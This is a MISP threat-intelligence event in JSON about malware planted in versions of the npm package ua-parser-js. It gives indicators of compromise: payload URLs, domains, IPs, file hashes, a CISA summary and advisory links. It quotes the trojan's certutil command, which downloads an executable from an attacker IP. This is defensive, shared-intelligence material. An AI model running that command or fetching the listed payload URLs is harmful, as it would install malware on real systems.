{
    "Event":{
        "threat_level_id":"2",
        "date":"2021-10-24",
        "published":true,
        "info":"Malware Discovered in Popular NPM Package, ua-parser-js",
        "publish_timestamp":"1635064007",
        "timestamp":"1635063955",
        "Tag":[
            {
                "name":"type:OSINT"
            },
            {
                "name":"osint:lifetime=\"perpetual\""
            },
            {
                "name":"osint:certainty=\"50\""
            },
            {
                "name":"tlp:white"
            },
            {
                "name":"misp-galaxy:mitre-attack-pattern=\"Compromise Software Supply Chain - T1195.002\""
            },
            {
                "name":"misp-galaxy:mitre-attack-pattern=\"Compromise Software Dependencies and Development Tools - T1195.001\""
            }
        ],
        "Attribute":[
            {
                "category":"External analysis",
                "comment":"",
                "timestamp":"1635061972",
                "type":"link",
                "value":"https://github.com/advisories/GHSA-pjwm-rvh2-c87w",
                "to_ids":false
            },
            {
                "category":"External analysis",
                "comment":"",
                "timestamp":"1635062091",
                "type":"link",
                "value":"https://github.com/faisalman/ua-parser-js/issues/536",
                "to_ids":false
            },
            {
                "category":"Payload delivery",
                "comment":"",
                "timestamp":"1635062310",
                "type":"url",
                "value":"http://159.148.186.228/download/jsextension.exe",
                "to_ids":false
            },
            {
                "category":"Payload delivery",
                "comment":"",
                "timestamp":"1635062343",
                "type":"url",
                "value":"https://citationsherbe.at/sdd.dll",
                "to_ids":true
            },
            {
                "category":"Network activity",
                "comment":"",
                "timestamp":"1635062385",
                "type":"domain",
                "value":"citationsherbe.at",
                "to_ids":true
            },
            {
                "category":"Artifacts dropped",
                "comment":"sdd.dll",
                "timestamp":"1635062444",
                "type":"sha256",
                "value":"<sha256>",
                "to_ids":true
            },
            {
                "category":"Artifacts dropped",
                "comment":"jsextension.exe",
                "timestamp":"1635062474",
                "type":"sha256",
                "value":"<sha256>",
                "to_ids":true
            }
        ],
        "Object":[
            {
                "comment":"",
                "description":"Metadata used to generate an executive level report",
                "meta-category":"misc",
                "name":"report",
                "timestamp":"1635063955",
                "Attribute":[
                    {
                        "category":"External analysis",
                        "comment":"",
                        "timestamp":"1635061938",
                        "type":"link",
                        "value":"https://us-cert.cisa.gov/ncas/current-activity/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1635061938",
                        "type":"text",
                        "value":"Versions of a popular NPM package named ua-parser-js was found to contain malicious code. ua-parser-js is used in apps and websites to discover the type of device or browser a person is using from User-Agent data. A computer or device with the affected software installed or running could allow a remote attacker to obtain sensitive information or take control of the system. \r\n\r\nCISA urges users and administers using compromised ua-parser-js versions 0.7.29, 0.8.0, and 1.0.0 to update to the respective patched versions: 0.7.30, 0.8.1, 1.0.1   \r\n\r\nFor more information, see Embedded malware in ua-parser-js.",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1635061938",
                        "type":"text",
                        "value":"Alert",
                        "to_ids":false
                    }
                ]
            },
            {
                "comment":"",
                "description":"Command line and option related to a software malicious or not to execute specific commands.",
                "meta-category":"misc",
                "name":"command-line",
                "timestamp":"1635063837",
                "Attribute":[
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1635062024",
                        "type":"text",
                        "value":"certutil -rulcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1635062024",
                        "type":"text",
                        "value":"The trojan try to execute in the cmd",
                        "to_ids":false
                    }
                ]
            },
            {
                "comment":"",
                "description":"Command line and option related to a software malicious or not to execute specific commands.",
                "meta-category":"misc",
                "name":"command-line",
                "timestamp":"1635063109",
                "Attribute":[
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1635062225",
                        "type":"text",
                        "value":"npm show ua-parser-js time",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1635062193",
                        "type":"text",
                        "value":"To check the time when the package was installed",
                        "to_ids":false
                    }
                ]
            },
            {
                "comment":"",
                "description":"A domain/hostname and IP address seen as a tuple in a specific time frame.",
                "meta-category":"network",
                "name":"domain-ip",
                "timestamp":"1635063682",
                "Attribute":[
                    {
                        "category":"Network activity",
                        "comment":"",
                        "timestamp":"1635062540",
                        "type":"domain",
                        "value":"citationsherbe.at",
                        "to_ids":true
                    },
                    {
                        "category":"Network activity",
                        "comment":"",
                        "timestamp":"1635062540",
                        "type":"ip-dst",
                        "value":"95.213.165.20",
                        "to_ids":true
                    }
                ]
            },
            {
                "comment":"",
                "description":"A domain/hostname and IP address seen as a tuple in a specific time frame.",
                "meta-category":"network",
                "name":"domain-ip",
                "timestamp":"1635062582",
                "Attribute":[
                    {
                        "category":"Network activity",
                        "comment":"",
                        "timestamp":"1635062582",
                        "type":"ip-dst",
                        "value":"159.148.186.228",
                        "to_ids":true
                    }
                ]
            },
            {
                "comment":"Vulnerable npm package UAParser.js - '0.7.29': '2021-10-22T12:15:21.378Z',\r\n'0.7.30': '2021-10-22T16:16:08.807Z',\r\n\r\n'0.8.0': '2021-10-22T12:16:06.877Z',\r\n'0.8.1': '2021-10-22T16:23:53.062Z',\r\n\r\n'1.0.0': '2021-10-22T12:16:19.726Z',\r\n'1.0.1': '2021-10-22T16:26:19.004Z',\r\n",
                "description":"File object describing a file with meta-information",
                "meta-category":"file",
                "name":"file",
                "timestamp":"1635063704",
                "Attribute":[
                    {
                        "category":"Payload installation",
                        "comment":"",
                        "timestamp":"1635062757",
                        "type":"pattern-in-file",
                        "value":"ua-parser-js",
                        "to_ids":true
                    }
                ]
            },
            {
                "comment":"",
                "description":"File object describing a file with meta-information",
                "meta-category":"file",
                "name":"file",
                "timestamp":"1635063451",
                "Attribute":[
                    {
                        "category":"Artifacts dropped",
                        "comment":"sdd.dll",
                        "timestamp":"1635062444",
                        "type":"md5",
                        "value":"<md5>",
                        "to_ids":true
                    },
                    {
                        "category":"Artifacts dropped",
                        "comment":"sdd.dll",
                        "timestamp":"1635062444",
                        "type":"sha1",
                        "value":"<sha1>",
                        "to_ids":true
                    },
                    {
                        "category":"Artifacts dropped",
                        "comment":"sdd.dll",
                        "timestamp":"1635062444",
                        "type":"sha256",
                        "value":"<sha256>",
                        "to_ids":true
                    }
                ]
            },
            {
                "comment":"",
                "description":"VirusTotal report",
                "meta-category":"misc",
                "name":"virustotal-report",
                "timestamp":"1635063777",
                "Attribute":[
                    {
                        "category":"Other",
                        "comment":"sdd.dll",
                        "timestamp":"1635062444",
                        "type":"datetime",
                        "value":"2021-10-24T04:03:55+00:00",
                        "to_ids":false
                    },
                    {
                        "category":"External analysis",
                        "comment":"sdd.dll",
                        "timestamp":"1635062444",
                        "type":"link",
                        "value":"https://www.virustotal.com/gui/file/2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd/detection/f-2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd-1635048235",
                        "to_ids":false
                    },
                    {
                        "category":"Artifacts dropped",
                        "comment":"sdd.dll",
                        "timestamp":"1635062444",
                        "type":"text",
                        "value":"23/50",
                        "to_ids":false
                    }
                ]
            }
        ]
    }
}